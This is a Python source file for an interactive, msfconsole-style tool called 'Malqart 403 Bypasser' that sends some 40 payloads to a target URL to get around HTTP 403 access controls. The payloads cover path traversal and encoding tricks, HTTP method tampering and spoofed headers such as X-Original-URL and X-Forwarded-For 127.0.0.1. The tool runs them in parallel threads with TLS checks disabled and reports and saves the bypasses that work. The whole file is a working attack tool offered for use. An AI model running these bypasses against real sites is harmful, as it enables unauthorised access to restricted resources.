#!/usr/bin/env python3
import os
import sys
import requests
import urllib3
from urllib.parse import urljoin, urlparse, quote
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================
# 🧪 403 BYPASS TECHNIQUES (40+)
# Organized by category for clarity and coverage
# ======================

BYPASS_PAYLOADS = []

# --- 1. PATH NORMALIZATION & TRAVERSAL ---
base_paths = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/./",
    "{path}/../{basename}",
    "{path}..;/",
    "{path};/",
    "{path}?",
    "{path}#",
    "{path}/*",
    "{path}%20",
    "{path}%09",
    "{path}%2e",           # %2e = '.'
    "/%2e/{path}",
    "{path}.html",
    "{path}.php",
    "{path}.json",
    "{path}/?anything",
]

for p in base_paths:
    BYPASS_PAYLOADS.append({
        "category": "Path Manipulation",
        "name": f"Path: {p.replace('{path}', 'TARGET')[:30]}",
        "method": "GET",
        "path": p,
        "headers": {}
    })

# --- 2. HTTP METHOD TAMPERING ---
methods = ["POST", "PUT", "TRACE", "OPTIONS", "DEBUG", "PATCH"]
for m in methods:
    BYPASS_PAYLOADS.append({
        "category": "HTTP Method",
        "name": f"Method: {m}",
        "method": m,
        "path": "{path}",
        "headers": {}
    })

# Special: POST with Content-Length: 0
BYPASS_PAYLOADS.append({
    "category": "HTTP Method",
    "name": "POST + Content-Length:0",
    "method": "POST",
    "path": "{path}",
    "headers": {"Content-Length": "0"}
})

# --- 3. HEADER-BASED BYPASSES ---
header_bypasses = [
    ("X-Original-URL", "{path}"),
    ("X-Rewrite-URL", "{path}"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "127.0.0.1:80"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("Referer", "{full_url}"),
    ("Origin", "{scheme}://{netloc}"),
]

for header, value in header_bypasses:
    BYPASS_PAYLOADS.append({
        "category": "Header Injection",
        "name": f"Header: {header}",
        "method": "GET",
        "path": "{path}",
        "headers": {header: value}
    })

# Special: X-Rewrite-URL on root
BYPASS_PAYLOADS.append({
    "category": "Header Injection",
    "name": "X-Rewrite-URL on /",
    "method": "GET",
    "path": "/",
    "headers": {"X-Rewrite-URL": "{path}"}
})

# --- 4. ENCODING & CASE VARIATIONS ---
encoding_tricks = [
    ("URL Encode", lambda p: quote(p, safe='')),
    ("Double URL Encode", lambda p: quote(quote(p, safe=''), safe='')),
    ("Uppercase", lambda p: p.upper()),
    ("Lowercase", lambda p: p.lower()),
    ("MixedCase", lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))),
]

for name, func in encoding_tricks:
    BYPASS_PAYLOADS.append({
        "category": "Encoding",
        "name": f"Encode: {name}",
        "method": "GET",
        "path_func": func,  # special handling in build
        "headers": {}
    })

# ======================
# SESSION CLASS
# ======================
class ForbiddenBypasserSession:
    def __init__(self):
        self.url = None
        self.threads = 15
        self.timeout = 8
        self.allow_redirects = False
        self.save_output = False
        self.output_file = "malqart_403_bypass_results.txt"
        self.verbose = False
        self.only_success = False  # Hide 403/404 in non-verbose mode

    def show_options(self):
        print("\nModule options:")
        print(f"  URL             => {self.url}")
        print(f"  THREADS         => {self.threads}")
        print(f"  TIMEOUT         => {self.timeout}")
        print(f"  FOLLOW_REDIRECT => {self.allow_redirects}")
        print(f"  VERBOSE         => {self.verbose}")
        print(f"  ONLY_SUCCESS    => {self.only_success}")
        print(f"  SAVE_OUTPUT     => {self.save_output}")
        print(f"  OUTPUT_FILE     => {self.output_file}\n")

    def _build_request(self, technique, base_url):
        parsed = urlparse(base_url)
        scheme = parsed.scheme
        netloc = parsed.netloc
        path = parsed.path or "/"
        if not path.startswith("/"):
            path = "/" + path
        basename = os.path.basename(path.rstrip("/")) or "index"

        # Handle dynamic path functions (encoding)
        if "path_func" in technique:
            final_path = technique["path_func"](path)
        else:
            final_path = technique["path"].format(
                path=path,
                basename=basename,
                full_url=base_url,
                scheme=scheme,
                netloc=netloc
            )

        target_url = urljoin(f"{scheme}://{netloc}", final_path)

        headers = {}
        for k, v in technique.get("headers", {}).items():
            headers[k] = v.format(
                path=path,
                basename=basename,
                full_url=base_url,
                scheme=scheme,
                netloc=netloc
            )

        return {
            "category": technique["category"],
            "name": technique["name"],
            "method": technique["method"],
            "url": target_url,
            "headers": headers
        }

    def _send_request(self, req):
        try:
            resp = requests.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                timeout=self.timeout,
                verify=False,
                allow_redirects=self.allow_redirects
            )
            return {
                "category": req["category"],
                "name": req["name"],
                "url": req["url"],
                "method": req["method"],
                "status": resp.status_code,
                "length": len(resp.content),
                "headers": dict(resp.headers)
            }
        except Exception as e:
            if self.verbose:
                return {
                    "category": req["category"],
                    "name": req["name"],
                    "url": req["url"],
                    "method": req["method"],
                    "status": None,
                    "length": 0,
                    "error": str(e)
                }
            return None

    def run_bypass(self):
        if not self.url:
            print("[-] Set URL first: set URL https://target.com/secret")
            return

        print(f"[*] Target: {self.url}")
        print(f"[*] Testing {len(BYPASS_PAYLOADS)} bypass techniques...")
        print("[*] Use 'set VERBOSE true' to see all attempts.\n")

        requests_data = [self._build_request(t, self.url) for t in BYPASS_PAYLOADS]

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._send_request, r) for r in requests_data]
            for future in as_completed(futures):
                res = future.result()
                if res:
                    results.append(res)

                    status = res.get("status")
                    if status and status not in (403, 404):
                        color = "\033[92m" if status in (200, 201, 204) else "\033[93m"
                        reset = "\033[0m"
                        indicator = f"{color}[✅ SUCCESS]{reset}" if status in (200, 201, 204, 302, 301) else f"{color}[⚠️  INTERESTING]{reset}"
                        print(f"{indicator} {res['name'][:25]:<25} | {res['method']:<7} | {res['url']} → {status}")

        # Save results
        if self.save_output and results:
            with open(self.output_file, "w") as f:
                f.write(f"Malqart 403 Bypasser Results\n")
                f.write(f"Target: {self.url}\n")
                f.write("="*70 + "\n\n")
                for r in results:
                    if r.get("status") not in (403, 404, None):
                        f.write(f"[{r['status']}] {r['name']} → {r['url']}\n")
            print(f"\n[+] Results saved to: {self.output_file}")

        print(f"\n[*] Completed. {len(results)} requests sent.")

# ======================
# CONSOLE INTERFACE
# ======================
def main():
    session = ForbiddenBypasserSession()
    print("Malqart 403 Bypasser v2.0 — Inspired by msfconsole")
    print("Use 'help' for commands. Type 'exit' to quit.\n")

    while True:
        try:
            cmd = input("Malqart403 > ").strip()
            if not cmd:
                continue

            parts = cmd.split()
            action = parts[0].lower()

            if action in ["exit", "quit"]:
                print("[*] Goodbye.")
                break

            elif action in ["help", "?"]:
                print("""
Commands:
  set URL <https://target.com/path>    → Target endpoint (required)
  set THREADS <num>                    → Concurrent requests (default: 15)
  set TIMEOUT <sec>                    → Request timeout (default: 8)
  set FOLLOW_REDIRECT <true/false>     → Follow redirects (default: false)
  set VERBOSE <true/false>             → Show all attempts (default: false)
  set ONLY_SUCCESS <true/false>        → (Future) Only show non-403/404
  set SAVE_OUTPUT <true/false>         → Save working bypasses
  set OUTPUT_FILE <file.txt>           → Output filename
  show options                         → Display settings
  run / exploit                        → Start bypass testing
  exit                                 → Quit
""")

            elif action == "set":
                if len(parts) < 3:
                    print("[-] Usage: set <OPTION> <VALUE>")
                    continue
                opt = parts[1].upper()
                val = ' '.join(parts[2:])
                try:
                    if opt == "URL":
                        session.url = val
                    elif opt == "THREADS":
                        session.threads = int(val)
                    elif opt == "TIMEOUT":
                        session.timeout = float(val)
                    elif opt == "FOLLOW_REDIRECT":
                        session.allow_redirects = val.lower() in ("1", "true", "yes", "on")
                    elif opt == "VERBOSE":
                        session.verbose = val.lower() in ("1", "true", "yes", "on")
                    elif opt == "SAVE_OUTPUT":
                        session.save_output = val.lower() in ("1", "true", "yes", "on")
                    elif opt == "OUTPUT_FILE":
                        session.output_file = val
                    else:
                        print("[-] Unknown option.")
                        continue
                    print(f"[*] {opt} => {val}")
                except Exception as e:
                    print(f"[-] Invalid value: {e}")

            elif action == "show" and len(parts) > 1 and parts[1].lower() == "options":
                session.show_options()

            elif action in ["run", "exploit"]:
                session.run_bypass()

            else:
                print(f"[-] Unknown command. Type 'help'.")

        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit.")
        except EOFError:
            print("\n[*] Exiting.")
            break
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
